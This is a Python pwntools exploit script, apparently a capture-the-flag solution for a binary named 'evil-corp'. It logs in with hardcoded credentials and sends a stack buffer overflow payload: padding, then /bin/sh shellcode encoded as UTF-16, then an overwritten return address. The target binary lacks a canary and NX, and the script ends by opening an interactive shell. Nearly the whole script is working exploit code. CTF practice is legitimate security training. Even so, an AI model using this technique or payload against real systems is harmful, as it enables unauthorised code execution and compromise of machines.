#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./binary --host 127.0.0.1 --port 1234
from pwn import *

# Set up pwntools for the correct architecture
exe = ELF("./evil-corp_patched")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

if exe.bits == 32:
    lindbg = "/root/linux_server32"
else:
    lindbg = "/root/linux_server"

def hi(io):
    import subprocess
    result = subprocess.run(['python3', '/root/Documents/tools/heapinspect/HeapInspect.py', str(io.pid)], capture_output=True, text=True)
    print(result.stdout)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1234)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

io.sendlineafter(b'Username:', b'eliot')
io.sendlineafter(b'Password:', b'4007')


# Option 1: strip the 0x00 bytes -> bytes after wchar->char conversion

io.sendlineafter(b'>>', b'2')

nb = '\U00000000'
shellcode_addr = '\U00011000'
shellcode = asm(shellcraft.linux.sh()).decode('utf-16')

pl = 'A' * 2048
pl += shellcode
pl += (nb * (4002 - len(pl))) + shellcode_addr + nb

log.warn(f'PL -> {len(pl)}')
# pause()
io.sendline(pl)

# io.sendlineafter(b'>>', b'3')

# io.sendline(b'')

io.interactive()